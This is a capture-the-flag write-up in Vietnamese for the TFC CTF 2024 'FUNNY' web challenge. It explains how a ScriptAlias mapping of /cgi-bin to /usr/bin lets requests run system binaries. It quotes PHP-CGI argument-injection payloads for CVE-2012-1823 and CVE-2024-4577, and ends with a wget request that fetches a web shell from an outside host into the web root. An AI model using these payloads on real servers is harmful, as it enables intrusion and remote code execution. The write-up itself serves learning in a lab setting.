# FUNNY (MEDIUM)

## PREVIEW

![image](https://hackmd.io/_uploads/HJ0dj31qA.png)

Chức năng Generate Joke

![image](https://hackmd.io/_uploads/Syijj2k5A.png)

## SOURCE CODE

![image](https://hackmd.io/_uploads/B1yT22k50.png)

File `index.php` không có gì ngoài in ra phần tử bất kì của mảng `jokes`

![image](https://hackmd.io/_uploads/Sk31p2k9A.png)

Vậy chắc chắn điều thú vị sẽ nằm trong file `httpd.conf`.

Trong file config có đoạn như sau:

```!
LoadModule cgi_module modules/mod_cgi.so
[...]
ScriptAlias /cgi-bin /usr/bin
Action php-script /cgi-bin/php-cgi
AddHandler php-script .php

<Directory /usr/bin>
    Order allow,deny
    Allow from all
</Directory>
```

Đầu tiên nó sẽ load `cgi_module` [Apache module](https://httpd.apache.org/docs/current/mod/mod_cgi.html).

> Vậy thì CGI là gì?
> CGI (Common GateWay Interface) định nghĩa cách 1 web server tương tác với các trình tạo nội dung bên ngoài, thường được gọi là CGI programs hay CGI scripts. Nó tạo ra 1 cách đơn giản để đưa các dynamic content lên website của bạn, sử dụng bất kì ngôn ngữ lập trình nào bạn quen nhất. Link dưới đây sẽ giới thiệu cách setting CGI cho Apache web server và bắt đầu viết các CGI programs của bạn. https://httpd.apache.org/docs/current/howto/cgi.html

Thông thường thì khi user gửi request tới path mà ràng buộc với CGI script, web server sẽ chạy CGI script và trả về kết quả tới user.

Trong trường hợp này, path `/cgi-bin` sẽ ràng buộc tới path trên OS là `/usr/bin` (`ScriptAlias /cgi-bin /usr/bin`). Bởi vì `/usr/bin` là nơi chứa các binaries, thì điều gì sẽ xảy ra nếu ta gửi 1 requets đến `/cgi/<binary-command>`?

Đầu tiên chạy docker web challenge của chúng ta. 
Thử request 1 command đơn giản xem. `/cgi-bin/id`

```!
2024-08-07 01:23:36 [Tue Aug 06 18:23:36.379654 2024] [cgi:error] [pid 92:tid 113] [client 172.17.0.1:55006] malformed header from script 'id': Bad header: uid=1000(www) gid=1000(www) gr
```

![image](https://hackmd.io/_uploads/r1B8cke9R.png)

Nó đã thực thi lệnh của chúng ta. Nhưng nếu chúng ta thêm các argument vào request thì sao?

![image](https://hackmd.io/_uploads/rJ10q1xqA.png)

`script not found or unable to stat`. Có vẻ như viết command bình thường với các argument sẽ không được thực thi. Tính sau vậy :>

Phần tiếp theo mình tìm được trong file config đó là nếu user request đến path kết thúc với extension `.php`, web server sẽ phân tích tập lệnh PHP thành [PHP CGI](https://www.php.net/manual/en/install.unix.commandline.php). Thực thi PHP script với PHP CGI thay vì PHP interpreter.

```!
Action php-script /cgi-bin/php-cgi
AddHandler php-script .php
```

Cuối cùng thì `/usr/bin` cho phép tất cả ai cũng có thể truy cập được.

```!
<Directory /usr/bin>
    Order allow,deny
    Allow from all
</Directory>
```

Quay trở lại với vấn đề chính là sao mà chúng ta có thể inject thêm được các argument cho command của chúng ta. Search với key word `PHP CGI argument injection`. Search bằng google và cả ChatGPT mình được các kết quả sau:
```!
1. CVE-2012-1823:
http://vulnerable/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
2. CVE-2024-4577:
/?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input=null
```

1 cái sử dụng `%AD` (kí tự gạch nối mềm - soft hyphen) và 1 cái sử dụng dấu `?` để thêm argument đầu tiên và các argument tiếp theo chỉ cần dấu `+` (dấu backspace đó). Test thử thôi.

![image](https://hackmd.io/_uploads/H1VlRJlqA.png)

Kết quả thành công. `id -u` ra kết quả `1000` trong `uid=1000(www) gid=1000(www) gr`. 

Check xem trong `/usr/bin` có binary nào có thể sử dụng để lấy flag hay không. Có 1 thứ hay ho ở đây.

```!
/ # ls -la /usr/bin | grep wget
lrwxrwxrwx 1 root root      12 Jul 22 14:34 wget -> /bin/busybox
```

Lúc đầu mình đã loay hoay thử cat luôn flag và gửi luôn sang webhook nhưng mà không được. Nhận ra rằng sử dụng web shell luôn thì hay hơn vì nhớ lại ở trên config vẫn cho up shell mà. (`cat`, và `more` thì đều ở `/bin`, còn `less` thì không dùng được...)

Host file web shell với pagekite.

![image](https://hackmd.io/_uploads/B1P-wxe5A.png)

Payload: `/cgi-bin/wget?https://perritoo.pagekite.me/webshell.php+-O+/var/www/public/webshell.php`
Như đã nói ở trên thì các argument tiếp theo chỉ cần dấu `+`, nếu vẫn thay bằng dấu `?` thì bị lỗi đó. 

![image](https://hackmd.io/_uploads/B1f2wll5A.png)
![image](https://hackmd.io/_uploads/SyfTDeg50.png)

Mở challenge và thực hiện thôi. 

![image](https://hackmd.io/_uploads/rJAV_xg5C.png)

Flag: `TFCCTF{1_4lm0st_f0rg0t_t0_push_th1s_fl4g_t0_th3_c0nt4in3r}`


**Thanks for [this](https://siunam321.github.io/ctf/TFC-CTF-2024/Web/FUNNY/) writeup. **

